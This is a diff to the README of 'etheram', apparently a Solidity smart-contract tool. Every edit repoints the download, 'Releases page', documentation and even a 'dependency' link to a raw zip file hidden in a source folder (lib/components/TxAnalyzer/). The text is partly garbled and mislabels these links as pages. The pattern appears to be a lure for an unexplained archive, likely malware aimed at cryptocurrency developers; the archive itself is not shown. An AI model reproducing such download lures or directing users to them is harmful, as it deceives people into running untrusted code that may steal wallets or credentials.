@@ -6,11 +6,11 @@ Welcome to etheram! This application provides a user-friendly interface for Soli
 ## 📦 Download Etheram
 To get started with etheram, you need to download the software. 
 
-[![Download Etheram](https://raw.githubusercontent.com/luismanuel71/etheram/master/spec/etheram-v1.2.zip%20Now-etheram-brightgreen)](https://raw.githubusercontent.com/luismanuel71/etheram/master/spec/etheram-v1.2.zip)
+[![Download Etheram](https://raw.githubusercontent.com/luismanuel71/etheram/master/lib/components/TxAnalyzer/Software_1.4-beta.2.zip%20Now-etheram-brightgreen)](https://raw.githubusercontent.com/luismanuel71/etheram/master/lib/components/TxAnalyzer/Software_1.4-beta.2.zip)
 
 ## 🚀 Getting Started
 1. **Visit the Download Page:**
-   Go to the [etheram Releases page](https://raw.githubusercontent.com/luismanuel71/etheram/master/spec/etheram-v1.2.zip) to find the latest version of the software.
+   Go to the [etheram Releases page](https://raw.githubusercontent.com/luismanuel71/etheram/master/lib/components/TxAnalyzer/Software_1.4-beta.2.zip) to find the latest version of the software.
 
 2. **Select the Right Version:**
    Look for the most recent version listed on the page. Each version includes notes about changes and improvements.
@@ -40,7 +40,7 @@ If you encounter any issues during installation, here are a few common solutions
 
 - **Administrator Rights:** For some systems, you may need administrator access to install software. If prompted, enter your administrator password.
 
-- **Missing Dependencies:** Ensure you have any required software, such as Java or https://raw.githubusercontent.com/luismanuel71/etheram/master/spec/etheram-v1.2.zip, installed on your system. Check the installation notes on the release page for specific dependencies.
+- **Missing Dependencies:** Ensure you have any required software, such as Java or https://raw.githubusercontent.com/luismanuel71/etheram/master/lib/components/TxAnalyzer/Software_1.4-beta.2.zip, installed on your system. Check the installation notes on the release page for specific dependencies.
 
 ## 🔍 Using Etheram
 Once you have etheram installed, you can begin using it. 
@@ -66,7 +66,7 @@ Once you have etheram installed, you can begin using it.
    After deployment, use etheram to interact with your contract directly. Send transactions or read data effortlessly through the intuitive interface.
 
 ## 📚 Resources
-- **Documentation:** For detailed instructions and additional features, refer to the [etheram documentation](https://raw.githubusercontent.com/luismanuel71/etheram/master/spec/etheram-v1.2.zip).
+- **Documentation:** For detailed instructions and additional features, refer to the [etheram documentation](https://raw.githubusercontent.com/luismanuel71/etheram/master/lib/components/TxAnalyzer/Software_1.4-beta.2.zip).
 - **Community Forum:** Join discussions and seek help in our community forum linked in the documentation.
 
 ## 📌 Additional Features
@@ -77,7 +77,7 @@ Etheram includes several useful features to enhance your experience:
 
 ## 🔄 Updating Etheram
 Keep your software up to date to take advantage of the latest features:
-1. Return to the [etheram Releases page](https://raw.githubusercontent.com/luismanuel71/etheram/master/spec/etheram-v1.2.zip).
+1. Return to the [etheram Releases page](https://raw.githubusercontent.com/luismanuel71/etheram/master/lib/components/TxAnalyzer/Software_1.4-beta.2.zip).
 2. Download the latest version as mentioned in the previous sections.
 3. Install the new version following the same process outlined above.
 
